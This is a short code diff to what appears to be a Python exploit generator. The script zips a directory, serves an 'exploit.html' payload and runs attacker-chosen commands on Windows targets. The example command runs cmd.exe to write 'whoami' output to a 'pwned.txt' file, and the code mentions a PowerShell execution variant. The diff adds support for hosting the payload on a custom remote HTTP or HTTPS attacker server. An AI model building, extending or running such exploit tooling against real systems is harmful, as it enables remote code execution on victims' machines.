@@ -5,6 +5,7 @@ import zipfile
 import http.server
 import socketserver
 import base64
+from urllib.parse import urlparse
 
 # Helper function to zip whole dir
 # https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
@@ -48,6 +49,17 @@ if __name__ == "__main__":
         raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")
 
     payload_url = f"http://{args.url}:{args.port}/exploit.html"
+
+    if args.url != "localhost":
+        url = urlparse(args.url)
+        if url.scheme == "":
+            raise SystemExit("Custom host mode requires HTTP or HTTPS, e.g. http://example.com")
+        elif url.scheme == "http":
+            payload_url = f"{args.url}:80"
+        elif url.scheme == "https":
+            payload_url = f"{args.url}:443"
+
+    print(payload_url)
 
     if args.mode == "command":
         # Original PowerShell execution variant
